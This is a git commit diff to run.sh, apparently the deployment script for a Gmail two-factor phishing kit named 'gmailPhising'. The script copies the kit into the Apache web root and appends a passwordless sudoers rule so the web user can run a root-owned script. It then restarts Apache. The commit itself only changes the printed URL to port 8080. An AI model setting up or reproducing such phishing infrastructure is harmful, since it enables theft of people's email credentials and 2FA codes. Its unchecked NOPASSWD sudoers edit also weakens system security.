7941655fe591adc64782edf2882d9ad80cc8e20d
okosun24 <75347837+okosun24@users.noreply.github.com>
2022-07-10 23:12:10 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,4 +3,4 @@ cp -r gmailPhising /var/www/html
 chown -R www-data:www-data /var/www
 echo -n "www-data ALL=(user) NOPASSWD: /root/2FAGmailPhising/root.sh" >> /etc/sudoers
 service apache2 restart
-echo "The service is running in http://127.0.0.1/gmailPhising/"
+echo "The service is running in http://127.0.0.1:8080/gmailPhising/"
